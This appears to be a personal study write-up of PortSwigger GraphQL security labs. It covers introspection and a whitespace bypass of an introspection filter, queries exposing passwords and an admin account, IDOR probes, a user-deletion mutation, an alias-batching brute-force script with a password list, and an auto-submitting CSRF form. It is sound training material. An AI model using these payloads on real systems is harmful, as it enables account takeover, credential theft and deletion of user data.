- [What is GraphQL?](#what-is-graphql)
- [Labs](#labs)
	- [Accessing private GraphQL posts](#accessing-private-graphql-posts)
	- [Accidental exposure of private GraphQL fields](#accidental-exposure-of-private-graphql-fields)
	- [Finding a hidden GraphQL endpoint](#finding-a-hidden-graphql-endpoint)
- [Bypassing GraphQL brute force protections](#bypassing-graphql-brute-force-protections)
- [Performing CSRF exploits over GraphQL](#performing-csrf-exploits-over-graphql)
- [Introspection disabled](#introspection-disabled)
- [Strappi](#strappi)
- [Useful tools](#useful-tools)
- [Tips](#tips)
- [Links](#links)

---

# What is GraphQL?
Is an **API query language** that is design to facilitate efficient communication between clients and servers.

GraphQL services are commonly used in authentication and data retrieval mechanism. They may be able to access vulnerable information or even execute higher-severity exploits such as CSRF.

It is best practice for production GraphQL endpoints to only accept POST request that have content-type of **application/json**, as this help to protect against CSRF vulnerabilities. However, some endpoints may accept alternative methods, such as GET or POST that accept content type of **x-www-form-urlencoded**.

It's possible that GraphQL endpoints have two types of access, **public** and **private**. To access private endpoints(this endpoints do operations like getUser) you need a key, for example in the **header Authorization**.

# Labs
## Accessing private GraphQL posts

This are the common name of endpoints:
- /graphql
- /api
- /api/graphql
- /graphql/api
- /graphql/graphql
- Sometimes can contain a version number, for example: /graphql/v1

If you check the http history of Burpsuite you see the endpoint **/graphql/v1**.

The next step is to try to do a **introspection query** that are special kinds of queries that allow you to learn about GraphQL API's schema.

If introspection is enable we can try to do:

- Discover hidden endpoints.
- Identify dangerous mutations like deleteAccount.
- Review permissions and roles like isAdmin:
- See functions that you don't have to see like normal user.

To check if introspection is enable we can use:

```grahpql
{
"query": "{__schema{queryType{name}}}"
}
```

If the response is something like this:

```graphql
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}
```

The query to see full introspection is the following, almost in the repeater > Graphql tab > right click > GraphQL > Set Instropection query(or try the legacy for old versions.)

```graphql
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
            ...FullType
        }
        directives {
            name
            description
            locations
            args {
                ...InputValue
            }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

In the response of introspection you can map and see the mutations and queries with right click > GraphQL > **Save GraphQL queries to sitemap**.

If you want to see only the **mutations**(entry points that allow to modify data) you can use this query:

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

Remember that we are searching in this lab a post that contain a secret password. In my case, if we go to the line one hundred fifty-six we found: `"name": "postPassword"`.

We have page like [GraphQL Visualizer](http://nathanrandal.com/graphql-visualizer/) (mutations don't appear) that allow us to render the query. When you paste the response **remember to remove the HTTP header**.

With this we found the possible queries and what can obtain from BlogPost, in this case exists the field **postPassword**.

Okey, how we can inspect the post, we have to build a query and the best way to do this is open a post a see in Burpsuite which query is used. 

```graphql
    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            image
            title
            author
            date
            paragraphs
        }
    }
```

We don't have idea about the id, but we know that we have to add the field postPassword. 

```graphql
    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            image
            title
            author
            date
            paragraphs
            postPassword
        }
    }
```

In variables:

```json
{"id":1}
```

When you send the request the postPassword field is null, but if you try with differents "id" the password should appear.

## Accidental exposure of private GraphQL fields

If we login we see that is doing a request to **/graphql/v1**.

```graphql
    mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    }
```

Variables
```json
{"input":{"username":"wiener","password":"peter"}}
```

And it return this:

```json
{
  "data": {
    "login": {
      "token": "c3hA43gLqjktbronhsusBb4iPVsUMPcg",
      "success": true
    }
  }
}
```

If we try to do a introspection query to obtain more information and use a grahpql-visualizer, we see that we have the **getUser(id:Int)** query, with id, username and password field. 

We have to build the query.

First of all the name of the query, in this case I'm going to name the query "credentials"

```graphql
query credentials {
     getUser(id:1) {
     	password
    		id
    		username
          }
}
```

If I send i see that doesn't work, unknown operation named 'log in'.

If you go to the json that is sending in the request you will see:

```json
{"query":"query credentials {\r\n     getUser(id:1) {\r\n     \tpassword\r\n    \t\tid\r\n    \t\tusername\r\n          }\r\n}","operationName":"login"}
```

This is because I'm reusing the login request that we have seen previosly. If you change the operationName to "credentials" you will see that you obtain the credentials of the first user, in this case administrator:

```json
{
  "data": {
    "getUser": {
      "password": "6skpsq1d2k29tr2w1sf6",
      "id": 1,
      "username": "administrator"
    }
  }
}
```

You can check the mutations, you will see login and changeEmail, but nothing about "deleteAccount".

En case that have deleteAccount query we can delete the user without know the password of Administrator.

One time log in you go to admin panel and delete carlos account to solve the lab.

## Finding a hidden GraphQL endpoint

In the http history we don't see any graphql endpoint, we can try to do fuzzing with more common endpoints:

```
/graphql
/graphiql
/api
/v1
/graphql/v1
/v1/graphql
/api/graphql
/graphql/api
/graphql/graphql
/graphiql/v1
/v1/graphiql
/api/graphiql
/graphiql/api
/graphiql/graphiql
```

The idea is to use the intruder and disable the url-encode these characters.

Choose a request, you can use the POST when the user try to login, or a simple GET. In the /api url the status code is different, 405 in the POST request and 400 in GET.

The next step to do a **universal query**, all endpoints that have graphql have to respond to this query.

Is important to see what is the **Content-Type** in the response, normally you have to added `Content-Type: application/json` to the request.

```json
{
"query":"query{__typename}"
}
```

If you add a **?query=** at the end of the url a tab called GraphQL will open.

To check if introspection is valid you can use the following query:

```
query{__schema{queryType{name}}}
```

Sometimes you can see this error message:

```
GraphQL introspection is not allowed, but the query contained __schema or __type
```

You can try to **bypass** this security, what happens if you add a space:

```
query{__schema {queryType{name}}}
```

You can try to add a space and an enter:

```
query{__schema 
    {queryType{name}}}
```

Boom, introspection is enabled. This is because the defenses check if the text have the specific characters.

To obtain more information with introspection we can use [graphql introspection official page](https://graphql.org/learn/introspection/)

To know the types we can use this operation:

```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

Ups doesn't work, remember to the "bypass"(do an enter)

```
query {
  __schema 
{
    types {
      name
    }
  }
}
```

We see that we have "DeleteOrganizationUserInput", "DeleteOrganizationUserResponse" and "User".

We can check if there is a user schema(that the type User exists)

```graphql
query {
  __type
    (name: "User") {
    name
  }
}
```

The idea is to delete an account, but if we search by "Account" we obtain a null response, this means that we are going to delete a user not an account.

Now we can do the introspection query to check all the schemas in the graphql endpoint.

```graphql
query IntrospectionQuery {
    __schema 
    {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
            ...FullType
        }
        directives {
            name
            description
            locations
            args {
                ...InputValue
            }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

Now you can go to [GraphQL Visualizer](http://nathanrandal.com/graphql-visualizer/) or InQL Burp Suite extension. Remember that graphql visualizer only show the queries and inQL also show the **mutation**.

In this case I use InQL, I put the url with the endpoint and the introspection response.

The idea is to delete the carlos user. To this, the mutation deleteOrganizationUser need an object DeleteOrganizationUserInput.

```graphql
mutation deleteOrganizationUser {
    deleteOrganizationUser(input: DeleteOrganizationUserInput) {
        user {
            id
            username
        }
    }
}
```

We have to investigate how to create this object, for this, we can go to introspection schema and search for "DeleteOrganizationUserInput".

```
{
          "kind": "INPUT_OBJECT",
          "name": "DeleteOrganizationUserInput",
          "inputFields": [
            {
              "name": "id",
              "type": {
                "kind": "NON_NULL",
                "ofType": {
                  "kind": "SCALAR",
                  "name": "Int"
                }
              }
            }
          ]
        }
```

We have the "id" input field, I imagine that the id is of the user.


The mutation will be something like this:
```graphql
mutation deleteOrganizationUser {
    deleteOrganizationUser(input: {
        id: X
    }) {
        user {
            id
            username
        }
    }
}
```

Know we need to know the ID of the user, to do this we can use **the query getUser()** to discover the id and retrieve Carlos data.

```
query getUser {
    getUser(id: 3) {
        id
        username
    }
}
```

Now we can try to delete other users before carlos and check with getUser if works, then delete carlos.

```graphql
mutation deleteOrganizationUser {
    deleteOrganizationUser(input: {
        id: 3
    }) {
        user {
            id
            username
        }
    }
}
```

# Bypassing GraphQL brute force protections

**Batching attack o aliasing** is a technique to abuse about how the server handler different operations in one time, **sending a lot of queries in one request to avoid limits**.

In this lab, if you try to login three times, you obtain this error:
"You have made too many incorrect login attempts. Please try again in 1 minute(s)."

First, we are going to do the introspection query and visualize the schema. We have getBlogPost and getAllBlogPosts but we're not going to use because we're focus on the login.

If we use the right click in the response > GraphQL > **Save GraphQL queries to sitemap**.

In tab target > Site map we have the graphql with the **queries and mutations**.

Now we have to generate the aliases to send all the queries in the same request. This is a very slow process, you can do some scripting, in this case in Tip tab of the lab appear this code:

```js
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

If you paste this in the console of your browser for example, you're going to obtain in your clipboard 100 queries with different passwords for the user carlos.

Now, if you paste to add this queries to the mutation:

```graphql
    mutation login {
bruteforce0:login(input:{password: "123456", username: "carlos"}) {
        token
        success
    }


bruteforce1:login(input:{password: "password", username: "carlos"}) {
        token
        success
    }
    ...
    ...
    ...
    }
```

And when we send this request(one request multiples queries) we see that in the response one of them have attribute `success` to true, if we search the number added in the request we will find the password for Carlos user and only in one request without being banned.

# Performing CSRF exploits over GraphQL

Okey, the idea in this lab is change the viewer's email address.

If we change the email and see the response with HTTP history we see that is a graphql request and send this to the repeater.

The idea is that another change is own email, CSRF attack.
For this we can't use a Content-Type: **application/json** because can't be sended, but if we try to change this with **x-www-form-urlencoded**. 

You can change manually or right click in the request and change request method two times(because change to GET and then to POST).

If we send the request we obtain the following string **"Query not present"**. This is a good sign because the body is not correctly for this type, but not means that x-www-form-urlencoded is not allowed.

We have to replace some characters and the url-encoded
```url-encoded
query=mutation%20changeEmail($input:ChangeEmailInput!) {changeEmail(input:$input) {email}}&operationName=changeEmail&variables={"input":{"email":"test2@test.com"}}
```

If we send the request and reload /my-account page we see that the email was successfully changed via x-www-form-urlencoded.

Here, you can use BurpSuite professional and build a CSRF PoC or create one manually:

```html
<html>
	<form
	action="https://0aa600a103c0f9ca80800d6700e90040.web-security-academy.net/graphql/v1"
	method="POST">
		<input type="hidden" name="query" value="&#x6d;&#x75;&#x74;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x43;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x21;&#x29;&#x20;&#x7b;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x29;&#x20;&#x7b;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x7d;&#x7d;"/>
		<input type="hidden" name="operationName" value="&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;"/>
		<input type="hidden" name="variables" value="&#x7b;&#x22;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x22;&#x3a;&#x7b;&#x22;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x22;&#x3a;&#x22;&#x74;&#x65;&#x73;&#x74;&#x34;&#x40;&#x74;&#x65;&#x73;&#x74;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x7d;&#x7d;"/>
	</form>
	<script>
		document.forms[0].submit()
	</script>
</html>
```

---

# Introspection disabled

The idea is to find some public queries that can do things like getUser or some interesting mutations.

First of all try to bypass security like adding an enter. [[🕸️ GraphQL API Vulnerabilities#Finding a hidden GraphQL endpoint]].

You can take advantage of **field suggestion feature** that is enable by default to discover new fields, example: write something bad like usr and in the response will see something like: Did you mean user?.


1. Test introspection via GET. It's possible that is not allowed via POST but GET?. You can change content-type in post with `x-www-form-urlencoded`:

```
/graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

2. **Search in javascript files**(To search in all files in Firefox > Debugger > ctrl + shift + f) for words like: **graphql**, query, mutation. You need to know the endpoints and how to make them.

3. If have ID like parameter you can try to change and provocate an IDOR.

```js
query {
  currentUser(internalId: 1337) {
    role
    name
    email
    token
  }
}
```

```js
query {
  listPosts(postId: 13) {
    title
    description
  }
}
```

3. If you discover additional objects such as "user" you can try to fetch additional sensitive information:

```js
query {
  listPosts(postId: 13) {
    title
    description
  }
user {
    username
    email
    firstName
    lastName
    }
}
```

4. In mutation you can add a field that is not visible or modificable, like role admin.

```js
mutation {
    registerAccount(nickname:"hacker", email:"hacktheplanet@yeswehack.ninja", password:"StrongP@ssword!", role:"Admin") {
        token {
             accessToken
        }
        user {
           email
           nickname
           role
           } 
       }
    }
}
```

6. Use some tools. [[#Useful tools]].

7. You can try to do [Batching attack](https://web.archive.org/web/20220516130039/https://lab.wallarm.com/graphql-batching-attack/). For example to bruteforce login or 2FA bypassing.

# Strappi

Strapi is a headless CMS(don't include frontend) write in node.js and it's used for create apis faster. In strappy you can list users with **usersPermissionsUsers**, but if the query is private you're going to obtain a forbidden message.

```graphql
query GetUsers {
  usersPermissionsUsers {
    data {
      id
      attributes {
        username
        email
      }
    }
  }
}
```

In application/json:

```json
{
  "operationName": "GetUsers",
  "variables": {},
  "query": "query GetUsers {\r\n  usersPermissionsUsers {\r\n    data {\r\n      id\r\n      attributes {\r\n        username\r\n        email\r\n      }\r\n    }\r\n  }\r\n}\r\n"
}
```

Response:
```json
{
  "errors": [
    {
      "message": "Forbidden access",
      "extensions": {
        "error": {
          "name": "ForbiddenError",
          "message": "Forbidden access",
          "details": {}
        },
        "code": "FORBIDDEN"
      }
    }
  ],
  "data": {
    "usersPermissionsUsers": null
  }
}
```

----
# Useful tools

- **InQL** extension from Burpsuite. Introspection needs to be enabled. You can discover queries, mutations... automatically and very organized.
- **graphw00f**: To identify the technology. With -f flag discover the technology used and try to identify vulnerabilites.
- [Clairvoyance](https://github.com/nikitastupin/clairvoyance). Obtain GraphQL API schema even if the introspection is disabled.
- [GraphQuail](https://github.com/forcesunseen/graphquail) Burp Suite extension that observate requests going through Burp and builds an internal GraphQL schema..

----

# Tips

To set Introspection query right click in GraphQL tab > Set introspection query or Set legacy introspection query.

----
# Links

- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html
- https://www.hackerone.com/blog/how-graphql-bug-resulted-authentication-bypass
- https://www.yeswehack.com/learn-bug-bounty/hacking-graphql-endpoints

